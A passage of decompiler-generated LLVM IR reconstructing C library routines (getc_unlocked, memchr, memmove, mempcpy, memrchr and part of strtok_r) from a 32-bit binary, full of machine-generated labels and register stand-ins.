  uselistorder label %dec_label_pc_8054e2d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054e1d, { 1, 0 }
  uselistorder label %dec_label_pc_8054db1, { 1, 0 }
  uselistorder label %dec_label_pc_8054cda, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_4()
  %stack_var_-5 = alloca i8, align 1
  %v0_8055240 = load i32, i32* @ebx, align 4
  %v4_8055244 = ptrtoint i16* %tmp to i32
  store i32 %v4_8055244, i32* @ebx, align 4
  %v1_8055248 = add i32 %v4_8055244, 16
  %v2_8055248 = inttoptr i32 %v1_8055248 to i32*
  %v3_8055248 = load i32, i32* %v2_8055248, align 4
  %v2_805524b = add i32 %v4_8055244, 24
  %v3_805524b = inttoptr i32 %v2_805524b to i32*
  %v4_805524b = load i32, i32* %v3_805524b, align 4
  %v10_805524b = icmp ult i32 %v3_8055248, %v4_805524b
  br i1 %v10_805524b, label %dec_label_pc_80552ed, label %dec_label_pc_8055254

dec_label_pc_8055254:                             ; preds = %entry
  %v2_8055254 = load i16, i16* %tmp, align 2
  %v3_8055254 = zext i16 %v2_8055254 to i32
  %v1_8055257 = and i32 %v3_8055254, 131
  %v6_8055261 = icmp ugt i32 %v1_8055257, 128
  br i1 %v6_8055261, label %dec_label_pc_805527b, label %dec_label_pc_8055263

dec_label_pc_8055263:                             ; preds = %dec_label_pc_8055254
  %v0_8055263 = load i32, i32* @edx, align 4
  %v6_805526b = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8055263, i32 %v0_8055263)
  %v1_8055273 = icmp eq i32 %v6_805526b, 0
  %v1_8055275 = icmp eq i1 %v1_8055273, false
  br i1 %v1_8055275, label %dec_label_pc_8055312, label %dec_label_pc_8055263.dec_label_pc_805527b_crit_edge

dec_label_pc_8055263.dec_label_pc_805527b_crit_edge: ; preds = %dec_label_pc_8055263
  %v0_805527b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805527b

dec_label_pc_805527b:                             ; preds = %dec_label_pc_8055263.dec_label_pc_805527b_crit_edge, %dec_label_pc_8055254
  %v2_80552af = phi i32 [ %v0_805527b.pre, %dec_label_pc_8055263.dec_label_pc_805527b_crit_edge ], [ %v4_8055244, %dec_label_pc_8055254 ]
  %v1_805527b = inttoptr i32 %v2_80552af to i16*
  %v2_805527b = load i16, i16* %v1_805527b, align 2
  %v3_805527b = zext i16 %v2_805527b to i32
  store i32 %v3_805527b, i32* @ecx, align 4
  %v2_805527e = and i16 %v2_805527b, 2
  %v3_805527e = icmp eq i16 %v2_805527e, 0
  br i1 %v3_805527e, label %dec_label_pc_805529e, label %dec_label_pc_8055283

dec_label_pc_8055283:                             ; preds = %dec_label_pc_805527b
  %tmp20 = urem i16 %v2_805527b, 2
  %v1_8055285 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8055285
  %v2_8055288 = and i32 %tmp19, 4
  %v3_8055288 = add i32 %v2_80552af, 36
  %v4_8055288 = add i32 %v3_8055288, %v2_8055288
  %v5_8055288 = inttoptr i32 %v4_8055288 to i8*
  %v6_8055288 = load i8, i8* %v5_8055288, align 1
  %v7_8055288 = zext i8 %v6_8055288 to i32
  %v8_8055288 = load i32, i32* @edx, align 4
  %v9_8055288 = and i32 %v8_8055288, -256
  %v10_8055288 = or i32 %v9_8055288, %v7_8055288
  store i32 %v10_8055288, i32* %edx.global-to-local, align 4
  %v1_805528c = add i16 %v2_805527b, -1
  store i16 %v1_805528c, i16* %v1_805527b, align 2
  %v0_8055292 = load i32, i32* @ebx, align 4
  %v1_8055292 = add i32 %v0_8055292, 40
  %v2_8055292 = inttoptr i32 %v1_8055292 to i32*
  store i32 0, i32* %v2_8055292, align 4
  %v0_8055299 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055299 = urem i32 %v0_8055299, 256
  store i32 %v1_8055299, i32* @edx, align 4
  br label %dec_label_pc_8055315

dec_label_pc_805529e:                             ; preds = %dec_label_pc_805527b
  %v1_805529e = add i32 %v2_80552af, 16
  %v2_805529e = inttoptr i32 %v1_805529e to i32*
  %v3_805529e = load i32, i32* %v2_805529e, align 4
  %v1_80552a1 = add i32 %v2_80552af, 20
  %v2_80552a1 = inttoptr i32 %v1_80552a1 to i32*
  %v3_80552a1 = load i32, i32* %v2_80552a1, align 4
  %v15_80552a1 = icmp eq i32 %v3_80552a1, %v3_805529e
  %v1_80552a4 = icmp eq i1 %v15_80552a1, false
  br i1 %v1_80552a4, label %dec_label_pc_80552ed, label %dec_label_pc_80552a6

dec_label_pc_80552a6:                             ; preds = %dec_label_pc_805529e
  %v1_80552a6 = add i32 %v2_80552af, 4
  %v2_80552a6 = inttoptr i32 %v1_80552a6 to i32*
  %v3_80552a6 = load i32, i32* %v2_80552a6, align 4
  %v13_80552a6 = icmp eq i32 %v3_80552a6, -2
  %v1_80552aa = icmp eq i1 %v13_80552a6, false
  br i1 %v1_80552aa, label %dec_label_pc_80552b4, label %dec_label_pc_80552ac

dec_label_pc_80552ac:                             ; preds = %dec_label_pc_80552a6
  %v1_80552ac = or i32 %v3_805527b, 4
  store i32 %v1_80552ac, i32* @ecx, align 4
  %v1_80552af = trunc i32 %v1_80552ac to i16
  store i16 %v1_80552af, i16* %v1_805527b, align 2
  br label %dec_label_pc_8055312

dec_label_pc_80552b4:                             ; preds = %dec_label_pc_80552a6
  %v3_80552b4 = and i16 %v2_805527b, 768
  %v4_80552b4 = icmp eq i16 %v3_80552b4, 0
  br i1 %v4_80552b4, label %dec_label_pc_80552c9, label %dec_label_pc_80552b9

dec_label_pc_80552b9:                             ; preds = %dec_label_pc_80552b4
  %v3_80552c1 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8062b7c.185 to i16*))
  %v0_80552c9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80552c9

dec_label_pc_80552c9:                             ; preds = %dec_label_pc_80552b4, %dec_label_pc_80552b9
  %v0_80552fe = phi i32 [ %v2_80552af, %dec_label_pc_80552b4 ], [ %v0_80552c9.pre, %dec_label_pc_80552b9 ]
  %v1_80552c9 = add i32 %v0_80552fe, 8
  %v2_80552c9 = inttoptr i32 %v1_80552c9 to i32*
  %v3_80552c9 = load i32, i32* %v2_80552c9, align 4
  %v1_80552cc = add i32 %v0_80552fe, 12
  %v2_80552cc = inttoptr i32 %v1_80552cc to i32*
  %v3_80552cc = load i32, i32* %v2_80552cc, align 4
  %v15_80552cc = icmp eq i32 %v3_80552cc, %v3_80552c9
  br i1 %v15_80552cc, label %dec_label_pc_80552f6, label %dec_label_pc_80552d1

dec_label_pc_80552d1:                             ; preds = %dec_label_pc_80552c9
  %v2_80552d4 = add i32 %v0_80552fe, 24
  %v3_80552d4 = inttoptr i32 %v2_80552d4 to i32*
  store i32 %v3_80552c9, i32* %v3_80552d4, align 4
  %v0_80552d7 = load i32, i32* @ebx, align 4
  %v2_80552d8 = call i32 @__stdio_rfill(i32 %v0_80552d7)
  %v1_80552e0 = icmp eq i32 %v2_80552d8, 0
  br i1 %v1_80552e0, label %dec_label_pc_8055312, label %dec_label_pc_80552e4

dec_label_pc_80552e4:                             ; preds = %dec_label_pc_80552d1
  %v0_80552e4 = load i32, i32* @ebx, align 4
  %v1_80552e4 = add i32 %v0_80552e4, 20
  %v2_80552e4 = inttoptr i32 %v1_80552e4 to i32*
  %v3_80552e4 = load i32, i32* %v2_80552e4, align 4
  %v2_80552e7 = add i32 %v0_80552e4, 24
  %v3_80552e7 = inttoptr i32 %v2_80552e7 to i32*
  store i32 %v3_80552e4, i32* %v3_80552e7, align 4
  %v0_80552ea = load i32, i32* @ebx, align 4
  %v1_80552ea = add i32 %v0_80552ea, 16
  %v2_80552ea = inttoptr i32 %v1_80552ea to i32*
  %v3_80552ea = load i32, i32* %v2_80552ea, align 4
  br label %dec_label_pc_80552ed

dec_label_pc_80552ed:                             ; preds = %dec_label_pc_805529e, %entry, %dec_label_pc_80552e4
  %v1_80552f1 = phi i32 [ %v2_80552af, %dec_label_pc_805529e ], [ %v4_8055244, %entry ], [ %v0_80552ea, %dec_label_pc_80552e4 ]
  %v0_80552ed = phi i32 [ %v3_805529e, %dec_label_pc_805529e ], [ %v3_8055248, %entry ], [ %v3_80552ea, %dec_label_pc_80552e4 ]
  %v1_80552ed = inttoptr i32 %v0_80552ed to i8*
  %v2_80552ed = load i8, i8* %v1_80552ed, align 1
  %v3_80552ed = zext i8 %v2_80552ed to i32
  store i32 %v3_80552ed, i32* @edx, align 4
  %v1_80552f0 = add i32 %v0_80552ed, 1
  %v2_80552f1 = add i32 %v1_80552f1, 16
  %v3_80552f1 = inttoptr i32 %v2_80552f1 to i32*
  store i32 %v1_80552f0, i32* %v3_80552f1, align 4
  %v0_8055318.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055315

dec_label_pc_80552f6:                             ; preds = %dec_label_pc_80552c9
  %v2_80552f9 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80552fe = inttoptr i32 %v0_80552fe to i16*
  %v5_80552ff = call i32 @__stdio_READ(i16* %v5_80552fe, i32 %v2_80552f9, i32 1)
  %v1_8055307 = icmp eq i32 %v5_80552ff, 0
  br i1 %v1_8055307, label %dec_label_pc_8055312, label %dec_label_pc_805530b

dec_label_pc_805530b:                             ; preds = %dec_label_pc_80552f6
  %v3_805530b = load i8, i8* %stack_var_-5, align 1
  %v4_805530b = sext i8 %v3_805530b to i32
  store i32 %v4_805530b, i32* @edx, align 4
  br label %dec_label_pc_8055315

dec_label_pc_8055312:                             ; preds = %dec_label_pc_80552f6, %dec_label_pc_80552d1, %dec_label_pc_8055263, %dec_label_pc_80552ac
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8055315

dec_label_pc_8055315:                             ; preds = %dec_label_pc_805530b, %dec_label_pc_80552ed, %dec_label_pc_8055283, %dec_label_pc_8055312
  %v0_8055318 = phi i32 [ %v4_805530b, %dec_label_pc_805530b ], [ %v0_8055318.pre, %dec_label_pc_80552ed ], [ %v1_8055299, %dec_label_pc_8055283 ], [ -1, %dec_label_pc_8055312 ]
  store i32 %v0_8055240, i32* @ebx, align 4
  ret i32 %v0_8055318

; uselistorder directives
  uselistorder i32 %v0_80552ed, { 1, 0 }
  uselistorder i32 %v3_80552c9, { 1, 0 }
  uselistorder i32 %v0_80552fe, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805529e, { 1, 0 }
  uselistorder i32 %v1_8055299, { 1, 0 }
  uselistorder i16 %v2_805527b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80552af, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_8062bc0.184, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8055315, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055312, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80552ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80552c9, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_805531c = load i32, i32* @edi, align 4
  store i32 %v0_805531c, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8055323 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055323, i32* %edi.global-to-local, align 4
  %v1_805532b = icmp eq i32 %arg3, 0
  store i1 %v1_805532b, i1* %zf.global-to-local, align 1
  br i1 %v1_805532b, label %dec_label_pc_805533b, label %dec_label_pc_805532f

dec_label_pc_805532f:                             ; preds = %entry
  %v2_805532f = call i32 @_strlen(i8* %arg1)
  %v3_805532f = mul i32 %v2_805532f, -1
  %v4_805532f = add i32 %v3_805532f, -2
  store i32 %v4_805532f, i32* @ecx, align 4
  %v0_8055331 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055331, label %dec_label_pc_805532f.dec_label_pc_8055338_crit_edge, label %dec_label_pc_8055333

dec_label_pc_805532f.dec_label_pc_8055338_crit_edge: ; preds = %dec_label_pc_805532f
  %v0_8055338.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8055338.pre, -1
  br label %dec_label_pc_8055338

dec_label_pc_8055333:                             ; preds = %dec_label_pc_805532f
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055338

dec_label_pc_8055338:                             ; preds = %dec_label_pc_805532f.dec_label_pc_8055338_crit_edge, %dec_label_pc_8055333
  %v0_8055338 = phi i32 [ %phitmp, %dec_label_pc_805532f.dec_label_pc_8055338_crit_edge ], [ 0, %dec_label_pc_8055333 ]
  %v8_8055338 = icmp eq i32 %v0_8055338, 0
  store i1 %v8_8055338, i1* %zf.global-to-local, align 1
  store i32 %v0_8055338, i32* %edi.global-to-local, align 4
  %v2_805533b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805533b

dec_label_pc_805533b:                             ; preds = %entry, %dec_label_pc_8055338
  %v0_805533c = phi i32 [ 0, %entry ], [ %v0_8055338, %dec_label_pc_8055338 ]
  %v2_805533b = phi i32 [ %v0_805531c, %entry ], [ %v2_805533b.pre, %dec_label_pc_8055338 ]
  store i32 %v2_805533b, i32* @edi, align 4
  ret i32 %v0_805533c

; uselistorder directives
  uselistorder i32 %v0_8055338, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805533b, { 1, 0 }
  uselistorder label %dec_label_pc_8055338, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8055341 = load i32, i32* @esi, align 4
  store i32 %v0_8055341, i32* %stack_var_-8, align 4
  %v4_8055342 = ptrtoint i8* %arg1 to i32
  %v9_805534e = icmp ugt i8* %tmp3, %arg1
  %v1_8055350 = icmp eq i1 %v9_805534e, false
  br i1 %v1_8055350, label %dec_label_pc_8055358, label %dec_label_pc_8055352

dec_label_pc_8055352:                             ; preds = %entry
  %v7_8055354 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  %v8_8055354 = ptrtoint i8* %v7_8055354 to i32
  store i32 %v8_8055354, i32* @ecx, align 4
  br label %dec_label_pc_8055364

dec_label_pc_8055358:                             ; preds = %entry
  %v3_8055358 = add i32 %arg2, -1
  %v4_8055358 = add i32 %v3_8055358, %tmp
  %v5_8055358 = inttoptr i32 %v4_8055358 to i8*
  %v3_805535c = add i32 %v4_8055342, -1
  %v4_805535c = add i32 %v3_805535c, %tmp
  %v5_805535c = inttoptr i32 %v4_805535c to i8*
  %v7_8055361 = call i8* @_memcpy(i8* %v5_805535c, i8* %v5_8055358, i32 %tmp)
  %v8_8055361 = ptrtoint i8* %v7_8055361 to i32
  store i32 %v8_8055361, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8055364

dec_label_pc_8055364:                             ; preds = %dec_label_pc_8055352, %dec_label_pc_8055358
  %v2_8055364 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055364, i32* @esi, align 4
  ret i32 %v4_8055342

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055364, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055368 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_805537b = inttoptr i32 %arg1 to i16*
  %v4_805537b = call i32 @memcpy(i16* %v3_805537b, i32 %arg2, i32 %arg3)
  %v0_8055383 = load i32, i32* @esi, align 4
  %v2_8055383 = add i32 %v0_8055383, %arg3
  store i32 %v0_8055368, i32* @esi, align 4
  ret i32 %v2_8055383
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8055391 = urem i32 %arg2, 256
  %v4_805539d = sext i8 %arg1 to i32
  %v2_80553a1 = add i32 %v4_805539d, %arg3
  %v1_80553b37 = icmp eq i32 %arg3, 0
  br i1 %v1_80553b37, label %dec_label_pc_80553bb, label %dec_label_pc_80553b7

dec_label_pc_80553a5:                             ; preds = %dec_label_pc_80553b7
  %v1_80553a5 = add i32 %v0_80553a5, -1
  %v5_80553a6 = load i32, i32* @edx, align 4
  %v6_80553a6 = and i32 %v5_80553a6, -256
  %v7_80553a6 = or i32 %v6_80553a6, %v4_8055391
  store i32 %v7_80553a6, i32* @edx, align 4
  %v1_80553aa = inttoptr i32 %v1_80553a5 to i8*
  %v2_80553aa = load i8, i8* %v1_80553aa, align 1
  %v15_80553aa = icmp eq i8 %v2_80553aa, %tmp
  br i1 %v15_80553aa, label %dec_label_pc_8055438, label %dec_label_pc_80553b2

dec_label_pc_80553b2:                             ; preds = %dec_label_pc_80553a5
  %v1_80553b2 = add i32 %v0_80553b2, -1
  %v8_80553b2 = icmp eq i32 %v1_80553b2, 0
  br i1 %v8_80553b2, label %dec_label_pc_80553bb, label %dec_label_pc_80553b7

dec_label_pc_80553b7:                             ; preds = %entry, %dec_label_pc_80553b2
  %v0_80553b2 = phi i32 [ %v1_80553b2, %dec_label_pc_80553b2 ], [ %arg3, %entry ]
  %v0_80553a5 = phi i32 [ %v1_80553a5, %dec_label_pc_80553b2 ], [ %v2_80553a1, %entry ]
  %v2_80553b7 = urem i32 %v0_80553a5, 4
  %v3_80553b7 = icmp eq i32 %v2_80553b7, 0
  %v1_80553b9 = icmp eq i1 %v3_80553b7, false
  br i1 %v1_80553b9, label %dec_label_pc_80553a5, label %dec_label_pc_80553bb

dec_label_pc_80553bb:                             ; preds = %dec_label_pc_80553b2, %dec_label_pc_80553b7, %entry
  %v0_805541e.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80553b2 ], [ %v0_80553b2, %dec_label_pc_80553b7 ]
  %v0_80553c0 = phi i32 [ %v2_80553a1, %entry ], [ %v1_80553a5, %dec_label_pc_80553b2 ], [ %v0_80553a5, %dec_label_pc_80553b7 ]
  store i32 %v0_80553c0, i32* @ecx, align 4
  %v2_80553c4 = mul nuw nsw i32 %v4_8055391, 256
  %v2_80553c7 = or i32 %v2_80553c4, %v4_8055391
  %v2_80553cb = mul i32 %v2_80553c7, 65536
  %v2_80553ce = or i32 %v2_80553cb, %v2_80553c7
  %v6_805542155 = icmp ugt i32 %v0_805541e.pr, 3
  br i1 %v6_805542155, label %dec_label_pc_80553d2, label %dec_label_pc_8055423

dec_label_pc_80553d2:                             ; preds = %dec_label_pc_80553bb, %dec_label_pc_805541b
  %v0_805541b57 = phi i32 [ %v1_805541b, %dec_label_pc_805541b ], [ %v0_805541e.pr, %dec_label_pc_80553bb ]
  %v0_80553d256 = phi i32 [ %v1_80553d2, %dec_label_pc_805541b ], [ %v0_80553c0, %dec_label_pc_80553bb ]
  %v1_80553d2 = add i32 %v0_80553d256, -4
  store i32 %v1_80553d2, i32* @ecx, align 4
  %v2_80553d7 = inttoptr i32 %v1_80553d2 to i32*
  %v3_80553d7 = load i32, i32* %v2_80553d7, align 4
  %v4_80553d7 = xor i32 %v3_80553d7, %v2_80553ce
  %v1_80553d9 = add i32 %v4_80553d7, 2130640639
  %v1_80553df = sub i32 -1, %v4_80553d7
  %v2_80553e1 = xor i32 %v1_80553d9, %v1_80553df
  %v1_80553e3 = and i32 %v2_80553e1, -2130640640
  %v2_80553e3 = icmp eq i32 %v1_80553e3, 0
  br i1 %v2_80553e3, label %dec_label_pc_805541b, label %dec_label_pc_80553eb

dec_label_pc_80553eb:                             ; preds = %dec_label_pc_80553d2
  %v7_80553eb = or i32 %v1_80553e3, %v4_8055391
  %v1_80553ef = add i32 %v0_80553d256, -1
  %v2_80553f2 = inttoptr i32 %v1_80553ef to i8*
  %v3_80553f2 = load i8, i8* %v2_80553f2, align 1
  %v16_80553f2 = icmp eq i8 %v3_80553f2, %tmp
  br i1 %v16_80553f2, label %dec_label_pc_8055438, label %dec_label_pc_80553f7

dec_label_pc_80553f7:                             ; preds = %dec_label_pc_80553eb
  %v1_80553fb = add i32 %v0_80553d256, -2
  %v2_80553fe = inttoptr i32 %v1_80553fb to i8*
  %v3_80553fe = load i8, i8* %v2_80553fe, align 1
  %v16_80553fe = icmp eq i8 %v3_80553fe, %tmp
  br i1 %v16_80553fe, label %dec_label_pc_8055438, label %dec_label_pc_8055403

dec_label_pc_8055403:                             ; preds = %dec_label_pc_80553f7
  %v1_8055407 = add i32 %v0_80553d256, -3
  %v2_805540a = inttoptr i32 %v1_8055407 to i8*
  %v3_805540a = load i8, i8* %v2_805540a, align 1
  %v16_805540a = icmp eq i8 %v3_805540a, %tmp
  br i1 %v16_805540a, label %dec_label_pc_8055438, label %dec_label_pc_805540f

dec_label_pc_805540f:                             ; preds = %dec_label_pc_8055403
  %v1_8055413 = inttoptr i32 %v1_80553d2 to i8*
  %v2_8055413 = load i8, i8* %v1_8055413, align 1
  %v15_8055413 = icmp eq i8 %v2_8055413, %tmp
  %v1_8055415 = icmp eq i1 %v15_8055413, false
  br i1 %v1_8055415, label %dec_label_pc_805541b, label %dec_label_pc_8055417

dec_label_pc_8055417:                             ; preds = %dec_label_pc_805540f
  br label %dec_label_pc_8055438

dec_label_pc_805541b:                             ; preds = %dec_label_pc_805540f, %dec_label_pc_80553d2
  %v5_805542827 = phi i32 [ %v7_80553eb, %dec_label_pc_805540f ], [ 0, %dec_label_pc_80553d2 ]
  %v1_805541b = add i32 %v0_805541b57, -4
  %v6_8055421 = icmp ugt i32 %v1_805541b, 3
  br i1 %v6_8055421, label %dec_label_pc_80553d2, label %dec_label_pc_8055423

dec_label_pc_8055423:                             ; preds = %dec_label_pc_805541b, %dec_label_pc_80553bb
  %v5_805542826.lcssa = phi i32 [ %v4_8055391, %dec_label_pc_80553bb ], [ %v5_805542827, %dec_label_pc_805541b ]
  %v0_80553d2.lcssa = phi i32 [ %v0_80553c0, %dec_label_pc_80553bb ], [ %v1_80553d2, %dec_label_pc_805541b ]
  %v0_805541b.lcssa = phi i32 [ %v0_805541e.pr, %dec_label_pc_80553bb ], [ %v1_805541b, %dec_label_pc_805541b ]
  br label %dec_label_pc_8055430

dec_label_pc_8055427:                             ; preds = %dec_label_pc_8055430
  %v1_8055430 = add i32 %v0_8055430, -1
  %v1_8055427 = add i32 %v0_8055427, -1
  %v6_8055428 = and i32 %v5_8055428, -256
  %v7_8055428 = or i32 %v6_8055428, %v4_8055391
  %v1_805542c = inttoptr i32 %v1_8055427 to i8*
  %v2_805542c = load i8, i8* %v1_805542c, align 1
  %v15_805542c = icmp eq i8 %v2_805542c, %tmp
  br i1 %v15_805542c, label %dec_label_pc_8055438, label %dec_label_pc_8055430

dec_label_pc_8055430:                             ; preds = %dec_label_pc_8055427, %dec_label_pc_8055423
  %v5_8055428 = phi i32 [ %v7_8055428, %dec_label_pc_8055427 ], [ %v5_805542826.lcssa, %dec_label_pc_8055423 ]
  %v0_8055427 = phi i32 [ %v1_8055427, %dec_label_pc_8055427 ], [ %v0_80553d2.lcssa, %dec_label_pc_8055423 ]
  %v0_8055430 = phi i32 [ %v1_8055430, %dec_label_pc_8055427 ], [ %v0_805541b.lcssa, %dec_label_pc_8055423 ]
  %v10_8055431 = icmp eq i32 %v0_8055430, 0
  %v1_8055434 = icmp eq i1 %v10_8055431, false
  br i1 %v1_8055434, label %dec_label_pc_8055427, label %dec_label_pc_8055436

dec_label_pc_8055436:                             ; preds = %dec_label_pc_8055430
  br label %dec_label_pc_8055438

dec_label_pc_8055438:                             ; preds = %dec_label_pc_80553a5, %dec_label_pc_8055403, %dec_label_pc_80553f7, %dec_label_pc_80553eb, %dec_label_pc_8055427, %dec_label_pc_8055417, %dec_label_pc_8055436
  %v0_805543b = phi i32 [ %v1_80553d2, %dec_label_pc_8055417 ], [ 0, %dec_label_pc_8055436 ], [ %v1_8055427, %dec_label_pc_8055427 ], [ %v1_8055407, %dec_label_pc_8055403 ], [ %v1_80553fb, %dec_label_pc_80553f7 ], [ %v1_80553ef, %dec_label_pc_80553eb ], [ %v1_80553a5, %dec_label_pc_80553a5 ]
  ret i32 %v0_805543b

; uselistorder directives
  uselistorder i32 %v0_8055430, { 1, 0 }
  uselistorder i32 %v1_805541b, { 0, 2, 1 }
  uselistorder i32 %v1_80553d2, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_80553d256, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80553c7, { 1, 0 }
  uselistorder i32 %v0_80553a5, { 1, 0, 2 }
  uselistorder i32 %v2_80553a1, { 1, 0 }
  uselistorder i32 %v4_8055391, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055438, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80553d2, { 1, 0 }
  uselistorder label %dec_label_pc_80553bb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80553b7, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805543c = load i32, i32* @edi, align 4
  %v0_805543d = load i32, i32* @esi, align 4
  %v0_805543e = load i32, i32* @ebx, align 4
  store i32 %v0_805543e, i32* %stack_var_-12, align 4
  %v4_805543f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805543f, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805544b = icmp eq i8* %arg1, null
  %v1_805544d = icmp eq i1 %v1_805544b, false
  br i1 %v1_805544d, label %dec_label_pc_8055451, label %dec_label_pc_805544f

dec_label_pc_805544f:                             ; preds = %entry
  %v1_805544f = inttoptr i32 %arg3 to i32*
  %v2_805544f = load i32, i32* %v1_805544f, align 4
  store i32 %v2_805544f, i32* @ebx, align 4
  br label %dec_label_pc_8055451

dec_label_pc_8055451:                             ; preds = %entry, %dec_label_pc_805544f
  %v0_8055454 = phi i32 [ %v4_805543f, %entry ], [ %v2_805544f, %dec_label_pc_805544f ]
  %v0_8055451 = load i32, i32* @ecx, align 4
  %v5_8055454 = inttoptr i32 %v0_8055454 to i8*
  %v8_8055455 = call i32 @__GI_strspn(i8* %v5_8055454, i32 %arg2, i32 %v0_8055451, i32 %v0_8055451)
  store i32 %v8_8055455, i32* %eax.global-to-local, align 4
  %v0_805545d = load i32, i32* @ebx, align 4
  %v2_805545d = add i32 %v0_805545d, %v8_8055455
  store i32 %v2_805545d, i32* @ebx, align 4
  %v1_805545f = inttoptr i32 %v2_805545d to i8*
  %v2_805545f = load i8, i8* %v1_805545f, align 1
  %v3_805545f = icmp eq i8 %v2_805545f, 0
  %v1_8055462 = icmp eq i1 %v3_805545f, false
  br i1 %v1_8055462, label %dec_label_pc_805546a, label %dec_label_pc_8055464

dec_label_pc_8055464:                             ; preds = %dec_label_pc_8055451
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8055466 = load i32, i32* @esi, align 4
  %v2_8055466 = inttoptr i32 %v1_8055466 to i32*
  store i32 %v2_805545d, i32* %v2_8055466, align 4
  %v0_8055494.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055491

dec_label_pc_805546a:                             ; preds = %dec_label_pc_8055451
  %v0_805546a = load i32, i32* @edx, align 4
  %v0_805546c = load i32, i32* @edi, align 4
  %v8_805546e = call i32 @__GI_strpbrk(i8* %v1_805545f, i32 %v0_805546c, i32 %v0_805546a, i32 %v0_805546a)
  store i32 %v8_805546e, i32* %eax.global-to-local, align 4
  %v2_8055476 = icmp eq i32 %v8_805546e, 0
  %v1_8055478 = icmp eq i1 %v2_8055476, false
  br i1 %v1_8055478, label %dec_label_pc_8055489, label %dec_label_pc_805547a

dec_label_pc_805547a:                             ; preds = %dec_label_pc_805546a
  %v0_805547e = load i32, i32* @ebx, align 4
  %v5_805547e = inttoptr i32 %v0_805547e to i8*
  %v8_805547f = call i32 @rawmemchr(i8* %v5_805547e, i32 0, i32 %v8_805546e, i32 %v8_805546e)
  br label %dec_label_pc_805548d

dec_label_pc_8055489:                             ; preds = %dec_label_pc_805546a
  %v9_805546e = inttoptr i32 %v8_805546e to i8*
  store i8 0, i8* %v9_805546e, align 1
  %v2_805548c = add i32 %v8_805546e, 1
  br label %dec_label_pc_805548d

dec_label_pc_805548d:                             ; preds = %dec_label_pc_805547a, %dec_label_pc_8055489
  %storemerge = phi i32 [ %v2_805548c, %dec_label_pc_8055489 ], [ %v8_805547f, %dec_label_pc_805547a ]
  %v0_805548d = phi i32 [ %v2_805548c, %dec_label_pc_8055489 ], [ %v8_805547f, %dec_label_pc_805547a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_805548d = load i32, i32* @esi, align 4
  %v2_805548d = inttoptr i32 %v1_805548d to i32*
  store i32 %v0_805548d, i32* %v2_805548d, align 4
  %v0_805548f = load i32, i32* @ebx, align 4
  store i32 %v0_805548f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055491

